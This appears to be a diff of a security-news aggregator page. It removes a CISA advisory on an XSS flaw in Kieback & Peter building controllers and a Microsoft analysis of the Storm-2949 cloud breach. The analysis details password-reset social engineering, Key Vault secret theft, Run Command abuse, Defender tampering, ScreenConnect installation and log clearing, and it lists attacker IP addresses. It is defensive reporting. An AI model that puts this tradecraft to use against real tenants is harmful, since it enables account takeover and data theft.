-Background
-- Critical Infrastructure Sectors: Commercial Facilities, Communications, Financial Services, Food and Agriculture, Government Services and Facilities, Healthcare and Public Health, Information Technology
-- Countries/Areas Deployed: Austria, China, France, Germany, United Arab Emirates
-- Company Headquarters Location: Germany
-Vulnerabilities
-[CVE-2026-4293](#)
-The affected products are vulnerable to cross-site scripting (XSS), enabling JavaScript to be executed by the victim's browser, which allows the attacker to control the browser.
-Affected Products
-Kieback & Peter DDC Building Controllers
-Kieback & Peter
-Kieback & Peter DDC4002: <=1.12.14, Kieback & Peter DDC4100: <=1.12.14, Kieback & Peter DDC4200: <=1.12.14, Kieback & Peter DDC4200-L: <=1.12.14, Kieback & Peter DDC4400: <=1.12.14, Kieback & Peter DDC4002e: <=1.23.4, Kieback & Peter DDC4200e: <=1.23.4, Kieback & Peter DDC4400e: <=1.23.4, Kieback & Peter DDC4020e: <=1.23.4, Kieback & Peter DDC4040e: <=1.23.4, Kieback & Peter DDC520: <=1.24.1
-known_affected
-Remediations
-Mitigation
-Kieback & Peter DDC Building Controllers are developed and designed for use in closed building automation networks. The system is protected by a multi-level perimeter against attacks, especially from outside, by dividing it into operational technology (OT) zones with firewalls. Building automation systems (BA systems) in general should not be directly accessible from untrusted networks, especially from the Internet, but should be protected by consistently applying the defense-in-depth strategy. This concept is supported by organizational measures in the building as part of a safety management system. In order to achieve safety, measures are required at all levels.
-Vendor fix
-The DDC4002, DDC4100, DDC4200, DDC4200-L and DDC4400 controllers are end-of-maintenance, therefore the recommendations for these devices are as follows: These devices must be operated in a strictly separate OT environment.
-Vendor fix
-The DDC4002, DDC4100, DDC4200, DDC4200-L and DDC4400 controllers are end-of-maintenance, therefore the recommendations for these devices are as follows: Only trusted individuals should be granted network access to the DDC web portal.
-Vendor fix
-The DDC4002, DDC4100, DDC4200, DDC4200-L and DDC4400 controllers are end-of-maintenance, therefore the recommendations for these devices are as follows: Access to the web portal should be disabled in the device configuration if not required.
-Vendor fix
-The DDC4002, DDC4100, DDC4200, DDC4200-L and DDC4400 controllers are end-of-maintenance, therefore the recommendations for these devices are as follows: Users should be informed that only links from trusted sources should be used to access the web service.
-Vendor fix
-For the DDC520, DDC4002e, DDC4200e, DDC4400e, DDC4020e, and DDC4040e controllers, Kieback & Peter recommends the following safety measure: Restrict network access to the device
-Vendor fix
-For the DDC520, DDC4002e, DDC4200e, DDC4400e, DDC4020e, and DDC4040e controllers, Kieback & Peter recommends the following safety measure: Do not directly connect the device to the Internet
-Vendor fix
-Update the firmware to the latest available version: DDC4002e -> Update to version 1.23.5 or newer
-Vendor fix
-Update the firmware to the latest available version: DDC4200e -> Update to version 1.23.5 or newer
-Vendor fix
-Update the firmware to the latest available version: DDC4400e -> Update to version 1.23.5 or newer
-Vendor fix
-Update the firmware to the latest available version: DDC4020e -> Update to version 1.23.5 or newer
-Vendor fix
-Update the firmware to the latest available version: DDC4040e -> Update to version 1.23.5 or newer
-Vendor fix
-Update the firmware to the latest available version: DDC520 -> Update to version 1.24.2 or newer
-Relevant CWE: [CWE-79 Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')](https://cwe.mitre.org/data/definitions/79.html)
-Metrics
-| CVSS Version | Base Score | Base Severity | Vector String |
-|---|---|---|---|
-| CVSS Version 3.1 | Base Score 5.3 | Base Severity MEDIUM | Vector String
-|
-Acknowledgments
-- Maximilian Hildebrand of G DATA Advanced Analytics reported this vulnerability to CISA
-Legal Notice and Terms of Use
-This product is provided subject to this Notification (https://www.cisa.gov/notification) and this Privacy & Use policy (https://www.cisa.gov/privacy-policy).
-Recommended Practices
-CISA recommends users take defensive measures to minimize the risk of exploitation of this vulnerability.
-Minimize network exposure for all control system devices and/or systems, ensuring they are not accessible from the internet.
-Locate control system networks and remote devices behind firewalls and isolating them from business networks.
-When remote access is required, use more secure methods, such as Virtual Private Networks (VPNs), recognizing VPNs may have vulnerabilities and should be updated to the most current version available. Also recognize VPN is only as secure as the connected devices.
-CISA reminds organizations to perform proper impact analysis and risk assessment prior to deploying defensive measures.
-CISA also provides a section for control systems security recommended practices on the ICS webpage on cisa.gov/ics. Several CISA products detailing cyber defense best practices are available for reading and download, including Improving Industrial Control Systems Cybersecurity with Defense-in-Depth Strategies.
-CISA encourages organizations to implement recommended cybersecurity strategies for proactive defense of ICS assets.
-Additional mitigation guidance and recommended practices are publicly available on the ICS webpage at cisa.gov/ics in the technical information paper, ICS-TIP-12-146-01B--Targeted Cyber Intrusion Detection and Mitigation Strategies.
-Organizations observing suspected malicious activity should follow established internal procedures and report findings to CISA for tracking and correlation against other incidents.
-CISA also recommends users take the following measures to protect themselves from social engineering attacks:
-Do not click web links or open attachments in unsolicited email messages.
-Refer to Recognizing and Avoiding Email Scams for more information on avoiding email scams.
-Refer to Avoiding Social Engineering and Phishing Attacks for more information on social engineering attacks.
-No known public exploitation specifically targeting this vulnerability has been reported to CISA at this time.
-Revision History
-- Initial Release Date: 2026-05-19
-| Date | Revision | Summary |
-|---|---|---|
-| Date 2026-05-19 | Revision 1 | Summary Initial Publication |
-Legal Notice and Terms of Use
-This product is provided subject to this [Notification](/notification) and this [Privacy & Use](/privacy-policy) policy.</div>
-            <br>
-            <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
-            <hr class="separator">
-        </div>
-        <div id="art-4" class="article-body">
+        <div id="art-5" class="article-body">
             <h2 class="article-title">Coverage-Driven Sustained Testing (CDST): A Graph-Oriented Model for Open-Ended Agentic Workflows</h2>
             <p class="source-link">Source: TrustedSec | <a href="https://trustedsec.com/blog/coverage-driven-sustained-testing-cdst-agentic-workflows" target="_blank">Original Link</a></p>
             <div class="content-text">[Blog](https://trustedsec.com/blog)[Coverage-Driven Sustained Testing (CDST): A Graph-Oriented Model for Open-Ended Agentic Workflows](https://trustedsec.com/blog/coverage-driven-sustained-testing-cdst-agentic-workflows)
@@ -319,142 +365,6 @@ CDST reframes agent work as a coverage or search space problem over a dynamicall
             <button class="back-btn" onclick="window.scrollTo(0,0)">[ Back to Menu ]</button>
             <hr class="separator">
         </div>
-        <div id="art-5" class="article-body">
-            <h2 class="article-title">How Storm-2949 turned a compromised identity into a cloud-wide breach</h2>
-            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/05/18/storm-2949-turned-compromised-identity-into-cloud-wide-breach/" target="_blank">Original Link</a></p>
-            <div class="content-text">Microsoft Threat Intelligence recently uncovered a methodical, sophisticated, and multi-layered attack, where a threat actor we track as Storm-2949 launched a relentless campaign with a singular focus: to exfiltrate as much sensitive data from a target organization’s high-value assets as possible. The attack exfiltrated data from Microsoft 365 applications, file-hosting services, and Azure-hosted production environments, where the organization’s production application ecosystem resides.
-What began as a targeted identity compromise rapidly evolved into a full-spectrum assault on the organization’s cloud infrastructure. The attack spanned various Azure resources, with emphasis on software-as-a-service (SaaS), platform-as-a-service (PaaS), and infrastructure-as-a-service (IaaS) layers.
-Storm-2949 didn’t rely on traditional malware and other on-premises tactics, techniques, and procedures (TTPs). Instead, they leveraged legitimate cloud and Azure management features to gain control-plane and data-plane access, which they then used to execute code remotely on VMs, and access sensitive cloud resources such as Key Vaults and storage accounts, among others. These activities allowed them to move laterally across cloud and endpoint environments while blending into expected administrative behavior.
-As organizations continue to adopt cloud infrastructure at scale, threat actors are increasingly targeting identity and control plane access rather than individual devices. When cloud identities are compromised, legitimate administrative features can be used to achieve outcomes similar to traditional lateral movement, often with fewer indicators of compromise. Behavior-based detections across endpoints, cloud environments, and identities—such as those provided by Microsoft Defender—can help teams identify and correlate these activities.
-In this blog, we unpack the full attack chain from initial access to cloud and endpoint takeover. We then offer actionable insights into how organizations can detect, contain, and prevent similar identity-driven threats in their environments.
-Attack chain overview
-The campaign that Storm-2949 deployed can be divided into two phases: targeted identity compromise and cloud infrastructure compromise. We discuss each of these phases in detail in the succeeding sections.
-Cloud compromise: Microsoft Entra ID and Microsoft 365
-In this phase, the threat actor targeted specific users through social engineering to obtain their Microsoft Entra ID credentials. Using these credentials, the threat actor then proceeded to exfiltrate data from Microsoft 365 applications.
-Initial access and persistence through targeted social engineering and SSPR abuse
-We assess with high confidence that Storm-2949 leveraged a social engineering technique consistent with known abuses of Microsoft’s Self-Service Password Reset (SSPR) process. In such attacks, a threat actor initiates the SSPR process on behalf of a targeted user and subsequently employs social engineering tactics to persuade the user to complete multifactor authentication (MFA) prompts that appear to be legitimate.
-For example, the threat actor might impersonate an internal information technology (IT) support representative and contact the user claiming that their account requires urgent verification, instructing them to approve MFA prompts as part of a routine password reset procedure.
-Once the user approves these prompts, the threat actor is able to reset the user’s password and remove existing authentication methods, such as phone numbers, email addresses, and Microsoft Authenticator registrations, effectively eliminating MFA as a control and enabling unrestricted account access. Immediately after gaining access to the compromised account, the threat actor is then prompted to re-enable MFA and register a new authentication method. At this stage, the threat actor enrolls Microsoft Authenticator on their own device, granting themselves persistent access and preventing the legitimate user from signing in.
-Storm-2949 used a similar process repeatedly across multiple users within the targeted organization. The selection of victims, which included IT personnel and senior leadership, indicated deliberate targeting. Based on the roles of the compromised users and the investigation findings, we assess that the threat actor likely used an organized and convincing phishing scheme to lure users into completing the fraudulent MFA prompts and thereby compromise their identities.
-Directory discovery and persistence
-Following the initial identity takeover, the threat actor conducted directory discovery using Microsoft Graph API. Using a custom Python script, they issued automated API requests to enumerate users and applications within the tenant. Through these queries, the threat actor searched Microsoft Entra ID for user accounts based on name patterns and role attributes, likely to identify privileged identities and additional high‑value targets.
-Figure 2 illustrates the types of Graph API queries observed:
-During this attack phase, the threat actor also attempted to establish persistence by adding credentials to a compromised service principal to enable continued access independent of the compromised user accounts. This attempt failed due to insufficient permissions. Undeterred, the threat actor continued enumerating service principals and known application identifiers, indicating an effort to map application‑level access paths and expand long‑term footholds within the environment.
-Using the same social engineering techniques and SSPR abuse described earlier, the threat actor expanded their foothold by compromising three additional cloud user accounts.
-Microsoft 365 discovery and exfiltration
-Storm-2949 leveraged their access to the compromised user accounts to explore and exfiltrate files from the victim organizations’ cloud file storage services. Shortly after obtaining initial access within the organization, they targeted Microsoft 365 applications, including OneDrive and SharePoint, identifying and accessing the organization’s sensitive files, focusing on IT documents concerning virtual private network (VPN) configurations and remote access procedures. We assess that this behavior reflects an attempt to identify opportunities for lateral movement from a compromised cloud identity into the endpoint network.
-The threat actor then launched a large-scale data exfiltration from these storage services. In one instance, Storm-2949 used the OneDrive web interface to download thousands of files in a single action to their own infrastructure. This pattern of data theft was repeated across all compromised user accounts, likely because different identities had access to different folders and shared directories.
-Cloud compromise: Microsoft Azure
-Armed with access to multiple compromised identities – which were assigned with privileged custom Azure role-based access control (RBAC) roles on several Azure subscriptions – and a growing understanding of the environment, the threat actor shifted focus toward the victim’s Azure environment. With a clear agenda centered on data exfiltration, Storm-2949 demonstrated a relentless drive to uncover and extract the most sensitive assets within the victim’s Azure environment, specifically from production-based Azure subscriptions.
-Their campaign targeted not only core applications but also the broader ecosystem of interconnected resources such as Azure App Services web applications, Azure Key Vaults, Azure Storage accounts, and SQL databases. These resources collectively power the organization’s cloud-hosted services. This phase marked a transition from identity-centric abuse and SaaS data theft to targeting a range of Azure services, with an emphasis on both PaaS and IaaS workloads.
-Azure App Service and Key Vault compromise
-One of Storm-2949’s main targets was a production Azure App Service web application that contained sensitive data. Following several failed attempts to access this application, likely due to gateway and network restrictions, Storm-2949 shifted focus to other web apps that appeared to be part of the same ecosystem. These auxiliary apps, such as those handling authentication or internal APIs, were individually deployed Azure App Service instances with their own resource identities.
-Storm-2949 successfully compromised several of these secondary web apps by taking advantage of the user’s privileged Azure RBAC permissions and invoking the Azure management-plane operation, microsoft.Web/sites/publishxml/action, which retrieves the application’s publishing profile. This profile often contains basic authentication credentials for deployment endpoints such as FTP, Web Deploy, and the Kudu management console. Kudu is a built-in administrative interface for Azure App Services that allows authenticated users to browse the file system, inspect environment variables, and execute commands within the app’s context.
-Despite successfully compromising several of these auxiliary web apps, Storm-2949 was unable to gain access to the primary production application they were ultimately targeting. It is assesed, that the secondary services, while part of the same broader ecosystem, didn’t contain the level of sensitive data or privileged access the threat actor was seeking. While these footholds provided visibility into application configurations and infrastructure, they didn’t deliver the high-value assets that aligned with the threat actor’s data exfiltration objectives. As a result, the threat actor was forced to pursue alternative paths in their effort to reach the production web app.
-Storm-2949 recalibrated their approach and shifted their focus toward backend resources that were part of the sensitive web app ecosystem and could provide stronger leverage. The threat actor pivoted to the organization’s Azure Key Vault estate – an environment more likely to centralize sensitive secrets and offer indirect access to production systems. Part of the compromised user’s Azure RBAC permissions was the privileged Owner role over a specific Key Vault that seemed to contain credentials that would enable the compromise of the production application.
-Over the span of four minutes, the threat actor successfully manipulated Key Vault access configurations and accessed dozens of secrets within the said Key Vault. These secrets included database connection strings, identity credentials, and more, dramatically expanding the attack’s blast radius.
-Among these secrets, we believe the threat actor found credentials that enabled them to access the application they coveted the most, which was the main production web app. After they successfully authenticated into the web app, the threat actor changed its password to retain control. They then began exfiltrating sensitive data from it.
-Azure Storage and SQL data exfiltration
-In parallel, Storm-2949 expanded access across additional cloud resources inside the ecosystem that contained the web app, including Azure Storage accounts and an Azure SQL server.
-To enable access to the server, the threat actor abused their existing Azure RBAC permissions to manipulate the SQL server firewall rules by using the microsoft.sql/servers/firewallrules/write operation. They then connected to the SQL server using the credentials they obtained (along with the web app credentials) from the compromised Key Vault.
-The threat actor proceeded with data exfiltration and continued to delete the modified SQL firewall rules, which is an activity consistent with defense evasion.
-Similar to the SQL server compromise, to set up and prepare for massive data exfiltration from Azure Storage, the threat actor also manipulated storage account network access configurations using the microsoft.storage/storageaccounts/write operation. This manipulation enabled public access to the storage accounts from a closed set of threat actor-owned IP addresses. In addition, the threat actor abused the Azure management-plane operation microsoft.Storage/storageAccounts/listkeys/action to access multiple storage account Shared Access Signature (SAS) tokens and account keys, enabling the use of static, non-interactive authentication to retrieve data.
-Using these keys, the threat actor downloaded large volumes of data from several Azure Storage accounts using a custom Python script that leveraged the Azure SDK for Storage. The script allowed them to programmatically enumerate and download blobs directly to their own endpoint device. This storage‑based exfiltration continued over multiple days since the initial access, with the threat actor alternating between secret- and OAuth‑based authentication as access conditions and controls evolved.
-Azure Virtual Machines compromise
-Apart from the web app and data-store resource compromise, the abuse of [Azure Virtual Machine (VM) extensions](https://learn.microsoft.com/azure/virtual-machines/extensions/overview) and administrative features – specifically [Run Command](https://learn.microsoft.com/azure/virtual-machines/run-command-overview) and the [VMAccess extension](https://learn.microsoft.com/azure/virtual-machines/extensions/vmaccess-windows) – were also prominent elements of this attack. These activities appear to have been primarily intended to expand operational access within the victim environment by leveraging compromised VMs as intermediary footholds. Observed actions across these systems focused on credential harvesting and environment discovery, as well as attempts to access resources that weren’t directly reachable through previously compromised identities. These efforts included domain reconnaissance and the collection of authentication material that could facilitate movement between cloud and on‑premises environments, as well as enable access to additional high‑value assets.
-Shortly after the initial access, the threat actor operated in parallel, trying to compromise the organization’s virtual machines. Using the compromised users assigned with privileged Azure RBAC permissions, the threat actor deployed the VMAccess extension to create a new local administrator account on a targeted VM. VMAccess is an Azure VM extension intended to help administrators restore access to a VM when credentials get lost or misconfigured by allowing password resets or the addition of privileged local users through the Azure management plane. In this case, the threat actor abused the extension to gain backdoor access to an administrator user on the VM.
-Using the Run Command feature, the threat actor deployed a script attempting to abuse the VM’s managed identity by requesting an access token from the Azure Instance Metadata Service (IMDS) and using it to authenticate to – and retrieve secrets from – the production web app-related Key Vault. However, the threat actor wasn’t able to retrieve the secrets because the managed identity lacked the required permissions. Yet, this attempt shows the threat actor using guest-level execution as a bridge to additional Azure resource access through workload identity.
-ScreenConnect installation and defense evasion
-Storm-2949 further abused the Run Command by running a PowerShell script intended to deploy persistent remote access while reducing host-based security visibility on multiple VMs.
-The script attempted to weaken Microsoft Defender Antivirus by disabling several protections, including real-time protection and behavior monitoring, and by interfering with its associated service. These changes lowered the likelihood that subsequent activity would be blocked or generate actionable alerts on the device.
-The script then installed the ScreenConnect remote monitoring and management (RMM) tool obtained from threat actor-controlled infrastructure. The installation process included several steps intended to masquerade the tool’s presence, such as making the network request appear consistent with trusted software updates and placing files in locations intended to resemble legitimate system content.
-To further obscure the tool’s presence, the script attempted to rename or configure the installed service to resemble legitimate Windows components, providing a simple form of local masquerading.
-Finally, the script attempted cleanup actions to remove local forensic artifacts that could be attributed to the threat actor. These included clearing Windows event logs, removing execution artifacts, and deleting command history and temporary files. Such steps are commonly observed in post-compromise activity and are generally intended to complicate investigation rather than provide durable evasion.
-Post-compromise activity using ScreenConnect
-The threat actor used the deployed ScreenConnect to launch commands across multiple compromised devices, performing basic discovery. This included collecting host level details (for example, operating system and configuration information) and enumerating domain context such as user accounts and group memberships.
-Across a subset of those hosts, the threat actor focused on credential harvesting techniques. They discovered and exfiltrated .pfx certificate files – artifacts that might contain private keys and could be valuable for follow-on access if imported or reused elsewhere. In parallel, they searched for remote file shares for likely credential exposure by scanning files for password related strings. Not every collection effort occurred on every host; rather, it was distributed across systems based on what data and access each host provided.
-These actions show ScreenConnect being used as a practical execution channel to run discovery, collect credentials, and attempt to operationalize access across different devices.
-While the threat actor ultimately established execution on several endpoints, these systems didn’t appear to yield high value data aligned with their objectives. The endpoint activity primarily served as a secondary capability for discovery and credential harvesting, rather than a core exfiltration channel.
-Throughout this incident, Microsoft Defender generated multiple alerts that helped analysts piece together activity across endpoints and cloud. Defender correlated these signals into unified incidents, surfacing high-fidelity alerts and a coherent view of threat actor activity. This kind of cross-domain correlation – collecting and normalizing telemetry and linking related alerts – illustrates the value of an integrated detection and response approach for improving signal-to-noise clarity and end-to-end visibility.
-Mitigation and protection guidance
-The visibility provided by correlated alerts across identities, cloud, and endpoints can help organizations investigate and understand attacks end-to-end. Building on this visibility, organizations can reduce risk and limit the impact of similar attacks by deploying appropriately scoped detection and response capabilities (including Microsoft Defender where applicable) and by applying targeted hardening practices.
-Ensure adequate security coverage across attack surfaces
-To effectively detect and respond to attacks that span identity, cloud, and endpoint environments, organizations should ensure they have monitoring, detection, and response capabilities deployed and properly configured across those surfaces. The following examples describe how Microsoft Defender capabilities can be used to help with this; equivalent controls might be available in other security solutions.
-Use Microsoft Defender for Endpoint for:
-[Tamper protection](https://learn.microsoft.com/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection)enabled to prevent threat actors from stopping security services such as Defender for Endpoint, which can help prevent hybrid cloud environment attacks.[Endpoint detection and response (EDR)](https://learn.microsoft.com/defender-endpoint/edr-in-block-mode)in block mode so that Defender for Endpoint can block malicious artifacts, even when your non-Microsoft antivirus doesn’t detect the threat or when Microsoft Defender Antivirus is running in passive mode. EDR in block mode works behind the scenes to remediate malicious artifacts detected post-breach.[Investigation and remediation](https://learn.microsoft.com/defender-endpoint/automated-investigations)in full automated mode to allow Defender for Endpoint to take immediate action on alerts to help remediate alerts, significantly reducing alert volume.
-Use [Microsoft Defender for Cloud](https://learn.microsoft.com/azure/defender-for-cloud/defender-for-cloud-introduction) to protect your cloud resources and assets from malicious activity, both in posture management ([Microsoft Defender Cloud Security Posture Management](https://www.microsoft.com/security/business/cloud-security/microsoft-defender-cloud-security-posture-management)), and threat detection capabilities. Enable workload protection capabilities across cloud resources, including:
-[Microsoft Defender for Resource Manager](https://learn.microsoft.com/azure/defender-for-cloud/tutorial-enable-resource-manager-plan)[Microsoft Defender for App Service](https://learn.microsoft.com/azure/defender-for-cloud/tutorial-enable-app-service-plan)[Microsoft Defender for Key Vault](https://learn.microsoft.com/azure/defender-for-cloud/tutorial-enable-key-vault-plan)[Microsoft Defender for Storage](https://learn.microsoft.com/azure/defender-for-cloud/defender-for-storage-introduction)[Microsoft Defender for Databases](https://learn.microsoft.com/azure/defender-for-cloud/defender-for-databases-overview)[Microsoft Defender for Servers](https://learn.microsoft.com/azure/defender-for-cloud/defender-for-servers-overview)
-In addition, leverage the Microsoft Defender XDR to hunt for threats across cloud environments and resource with [advanced hunting](https://learn.microsoft.com/defender-xdr/advanced-hunting-overview). Security teams can proactively investigate threat actor activity by querying telemetry across multiple domains using tables such as [CloudAuditEvents](https://learn.microsoft.com/defender-xdr/advanced-hunting-cloudauditevents-table), [CloudStorageAggregatedEvents](https://learn.microsoft.com/defender-xdr/advanced-hunting-cloudstorageaggregatedevents-table), and others, enabling deep visibility into control-plane and data-plane operations, authentication events, and cross-service attack patterns.
-Use [Microsoft Defender for Cloud Apps](https://learn.microsoft.com/defender-cloud-apps/what-is-defender-for-cloud-apps) and enable connectors to monitor SaaS activity.
-Security hardening and best practices
-In addition to deploying the appropriate Defender capabilities, organizations should apply the following security controls and practices to mitigate similar attack paths:
-Identity protection
-- Secure accounts with credential hygiene. Practice the
-[principle of least privilege](https://learn.microsoft.com/azure/active-directory/roles/delegate-by-task)and audit privileged account activity in your Microsoft Entra ID and Azure environments to slow or stop threat actors. [Enable Conditional Access policies](https://learn.microsoft.com/entra/identity/conditional-access/overview). Conditional Access policies are evaluated and enforced every time the user attempts to sign in. Organizations can protect themselves from attacks that leverage stolen credentials by enabling policies such as device compliance or trusted IP address requirements.[Ensure MFA](https://learn.microsoft.com/entra/identity/role-based-access-control/best-practices)is required for all users. Adding more authentication methods, such as the[Microsoft Authenticator app](https://learn.microsoft.com/entra/identity/authentication/how-to-enable-authenticator-passkey)or a phone number, increases the level of protection if one factor is compromised.- Ensure
-[phishing-resistant MFA strength](https://learn.microsoft.com/entra/identity/conditional-access/policy-admin-phish-resistant-mfa)is required for Administrators and privileged user accounts. - Ensure all existing privileged users have an already registered MFA method to protect against malicious MFA registrations
-- Implement
-[Conditional Access authentication strength](https://learn.microsoft.com/entra/identity/authentication/concept-authentication-strengths)to require phishing-resistant authentication for employees and external users for critical apps. - Refer to
-[Azure Identity Management and access control security best practices](https://learn.microsoft.com/azure/security/fundamentals/identity-management-best-practices)for further steps and recommendations to manage, design, and secure cloud environment. - Turn on
-[Microsoft Entra ID protection](https://learn.microsoft.com/azure/active-directory/identity-protection/howto-identity-protection-configure-risk-policies)to monitor identity-based risks and create risk-based Conditional Access policies to remediate risky sign-ins.
-Cloud resource protection
-- Use the
-[Azure Monitor activity](https://learn.microsoft.com/azure/azure-monitor/platform/activity-log?tabs=log-analytics)log to investigate and monitor Azure management events. - Configure and harden resources firewall rules and access controls to allow access only from trusted IP ranges and virtual networks to prevent unauthorized access.
-- Use Azure policies to continuously enforce the hardened configurations.
-- Practice and apply
-[Azure Storage security](https://learn.microsoft.com/azure/storage/blobs/security-recommendations)best practices: - Use Azure policies for Azure Storage to prevent network and security misconfigurations and maximize the protection of business data stored in your storage accounts.
-- Implement
-[Azure Blob Storage security recommendations](https://learn.microsoft.com/azure/storage/blobs/security-recommendations)for enhanced data protection. - Use the
-[options available for data protection](https://learn.microsoft.com/azure/storage/blobs/data-protection-overview)in Azure Storage. - Enable
-[immutable storage](https://learn.microsoft.com/azure/storage/blobs/immutable-storage-overview)for Azure Blob Storage to protect from accidental or malicious modification or deletion of blobs or storage accounts. - Enable Azure Monitor for Azure Blob Storage to collect, aggregate, and log data to enable recreation of activity trails for investigation purposes when a security incident occurs or network is compromised.
-[Use private endpoints for Azure Storage account access](https://learn.microsoft.com/azure/storage/common/storage-private-endpoints)to disable public network access for increased security.- Avoid using anonymous read access for blob data.
-[Enable](https://learn.microsoft.com/azure/backup/blob-backup-configure-manage?tabs=operational-backup)[Azure blob backup](https://learn.microsoft.com/azure/backup/blob-backup-overview?tabs=vaulted-backup)to protect from accidental or malicious deletions of blobs or storage accounts.- Apply the principle of least privilege when authorizing access to blob data in Azure Storage using
-[Microsoft Entra and RBAC](https://learn.microsoft.com/azure/storage/blobs/authorize-access-azure-active-directory)and configure fine-grained Azure Blob Storage access for sensitive data access through[Azure attribute-based access control (ABAC)](https://learn.microsoft.com/azure/storage/blobs/storage-auth-abac). - Practice and apply
-[Azure Key Vault security](https://learn.microsoft.com/azure/key-vault/general/secure-key-vault)best practices: [Enable][purge protection in Azure Key Vaults](https://learn.microsoft.com/azure/key-vault/general/soft-delete-overview#purge-protection)to prevent immediate, irreversible deletion of vaults and secrets. Use the default retention interval of 90 days.[Enable logs](https://learn.microsoft.com/azure/key-vault/general/howto-logging?tabs=azure-cli)in Azure Key Vault and retain them for up to a year to enable recreation of activity trails for investigation purposes when a security incident occurs or network is compromised.[Restrict public network access](https://learn.microsoft.com/azure/key-vault/general/network-security?tabs=azure-portal#public-access-disabled-private-endpoint-only)to Azure Key Vault by enabling private endpoints and disabling public access to reduce exposure to unauthorized access attempts.- Regularly audit Azure RBAC role assignments and Key Vault access policies, depending on the Key Vault permission model, to ensure least privilege and detect over-permissioned identities. Microsoft explicitly recommends Azure RBAC over Key Vault access policies.
-- Configure SQL server firewall rules to restrict access to known IP addresses and monitor for unauthorized changes to firewall configurations.
-- Enforce
-[authentication through Microsoft Entra ID](https://learn.microsoft.com/azure/azure-sql/database/authentication-aad-configure?view=azuresql&tabs=azure-portal)for SQL instances to reduce reliance on static credentials and improve access control - Practice and apply Azure App Service security
-[best practices](https://learn.microsoft.com/azure/app-service/overview-security): [Disable legacy authentication](https://learn.microsoft.com/azure/app-service/configure-basic-auth-disable?tabs=portal)methods and enforce managed identity usage for Azure App Services to prevent credential theft through publishing profiles.- Monitor and restrict access to Azure App Service publishing credentials by limiting RBAC permissions and auditing usage of the publish profile API.
-[Enable diagnostic logging](https://learn.microsoft.com/azure/app-service/troubleshoot-diagnostic-logs)in App Service logs to detect suspicious deployment or configuration changes.- Enable Microsoft Azure Backup for virtual machines to protect the data on your Microsoft Azure virtual machines, and to create recovery points that are stored in geo-redundant recovery vaults.
-- Audit and restrict the use of Azure VM features and extensions such as Run Command and VMAccess by limiting RBAC permissions and monitoring for suspicious invocation patterns.
-- Use
-[Azure Policy to restrict or audit](https://learn.microsoft.com/azure/virtual-machines/extensions/extensions-rmpolicy-howto-ps)the deployment of Azure VM extensions across your subscriptions.
-General hygiene recommendations
-[Investigate][Microsoft Security Exposure Management attack paths](https://learn.microsoft.com/security-exposure-management/work-attack-paths-overview). Security teams can use attack path analysis to trace cross-domain threats that pivot to cloud workloads, escalate privileges, and expand their reach.[Use Azure Policy to enforce organizational standards and prevent the deployment of risky configurations, such as public access to sensitive resources.](https://learn.microsoft.com/security-exposure-management/critical-asset-management)- Implement consistent
-[cloud security recommendations](https://learn.microsoft.com/azure/defender-for-cloud/review-security-recommendations?pivots=defender-portal)hygiene.
-Indicators of compromise (IOCs)
-IOCs reflect observations at the time of analysis and may not be exhaustive or persistent.
-| Indicator | Type | Description |
-| 176.123.4[.]44 | IP address | Attacker egressed from this address |
-| 91.208.197[.]87 | IP address | Attacker egressed from this address |
-| 185.241.208[.]243 | IP address | ScreenConnect instance used by Attacker |
-Microsoft Defender XDR detections
-Microsoft Defender XDR customers can refer to the list of applicable detections below. Microsoft Defender XDR coordinates detection, prevention, investigation, and response across endpoints, identities, email, and apps to provide integrated protection against attacks like the threat discussed in this blog.
-Customers with provisioned access can also use [Microsoft Security Copilot in Microsoft Defender](https://learn.microsoft.com/en-us/defender-xdr/security-copilot-in-microsoft-365-defender) to investigate and respond to incidents, hunt for threats, and protect their organization with relevant threat intelligence.
-Note that the following detections only covers the threat activities we’ve observed at the time of analysis.
-| Tactic | Observed activity | Microsoft Defender coverage |
-| Initial access | – Sign-in activity from attacker infrastructure to compromised identities – Sign-in and authentication activity to Azure resources | Microsoft Defender XDR – Authentication with compromised credentials – Compromised user account in a recognized attack pattern – Malicious sign in from a risky IP address – Malicious sign in from an IP address associated with recognized attacker infrastructure – Malicious sign in from recognized attacker infrastructure – Malicious sign-in from an unusual user agent – Malicious sign-in from known threat actor IP address – Successful authentication from a malicious IP – Successful authentication from a suspicious IP – Successful authentication using compromised credentials – User compromised through session cookie hijack – User signed in from a known malicious IP Address – Impossible Travel Microsoft Defender for Identity – Possibly compromised user account signed in – Possibly compromised service principal account signed in Microsoft Defender for Cloud Defender for Resource Manager Suspicious invocation of a high-risk ‘Initial Access’ operation detected (Preview) Defender for Databases Login from an unusual location Defender for Storage – Access from an unusual location to a storage account Access from an unusual location to a storage blob container – Access from an unusual location to a sensitive blob container – Access from a known suspicious IP address to a sensitive blob container – Access from a suspicious IP address – Unusual unauthenticated public access to a sensitive blob container |
-| Execution | – Various types of execution-related suspicious activity by an attacker were observed | Microsoft Defender XDR – Possibly compromised user ran a malicious script using an Azure VM extension – Potential hybrid ransomware or hands-on-keyboard attack originating from Azure VM extensions – Hybrid ransomware or hands-on-keyboard attack originating from Azure VM extensions – Azure VM extension activity followed by ransomware or hands-on-keyboard attack Microsoft Defender for Cloud Defender for Resource Manager – Suspicious invocation of a high-risk ‘Execution’ operation detected (Preview) – Azure Resource Manager operation from suspicious IP address – Suspicious Run Command invocation detected (Preview) Defender for Servers P2 – Run Command with a suspicious script was detected on your virtual machine – Suspicious Run Command usage was detected on your virtual machine (Preview) – Suspicious unauthorized Run Command usage was detected on your virtual machine (Preview) Microsoft Defender for Endpoint – Compromised account conducting hands-on-keyboard attack – Potential human-operated malicious activity – Suspicious process execution – Suspicious command execution via ScreenConnect – Suspicious activity through Azure VM extension process |
-| Persistence | – Attacker device registered as MFA method – ScreenConnect installed on Azure VMs | Microsoft Defender for Identity – Suspicious addition of default third‑party MFA method to user account – Suspicious Entra device join or registration Microsoft Defender for Cloud Apps – Suspicious addition of device with strong MFA – Suspicious addition of strong authentication device – Malicious device with strong MFA was registered Microsoft Defender for Endpoint Uncommon remote access software |
